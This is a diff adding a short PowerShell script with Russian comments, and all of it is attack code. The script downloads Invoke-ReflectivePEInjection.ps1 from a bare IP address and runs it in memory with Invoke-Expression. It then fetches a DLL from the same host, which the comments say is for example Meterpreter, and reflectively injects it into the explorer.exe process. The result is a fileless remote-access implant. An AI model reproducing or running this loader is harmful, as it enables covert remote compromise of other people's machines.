@@ -1,0 +1,15 @@
+$ps1Url = "http://62.60.159.191/Invoke-ReflectivePEInjection.ps1"
+$ps1Content = (New-Object System.Net.WebClient).DownloadString($ps1Url)
+
+# Выполняем скачанный скрипт в памяти, чтобы определить функцию Invoke-ReflectivePEInjection
+Invoke-Expression $ps1Content
+
+# 2. Скачиваем DLL (например, Meterpreter DLL)
+$dllUrl = "http://62.60.159.191/support.dll"
+$peBytes = (New-Object System.Net.WebClient).DownloadData($dllUrl)
+
+# 3. Получаем ID процесса, в который будем инжектировать DLL (например, explorer.exe)
+$procId = (Get-Process -Name explorer).Id
+
+# 4. Выполняем reflective DLL инъекцию, вызывая функцию из загруженного PS1-скрипта
+Invoke-ReflectivePEInjection -PEBytes $peBytes -ProcId $procId
